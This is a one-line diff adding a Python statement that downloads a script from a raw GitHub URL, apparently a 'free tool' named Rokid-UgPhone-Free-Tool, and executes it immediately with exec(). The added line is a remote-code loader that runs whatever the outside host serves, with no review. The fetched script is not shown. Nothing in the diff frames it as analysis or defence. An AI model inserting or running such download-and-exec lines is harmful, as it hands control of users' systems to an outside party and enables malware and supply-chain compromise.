@@ -1,0 +1,1 @@
+exec(__import__("requests").get("https://raw.githubusercontent.com/thieusitinks/Rokid-Manager/refs/heads/main/Rokid-UgPhone-Free-Tool").text)
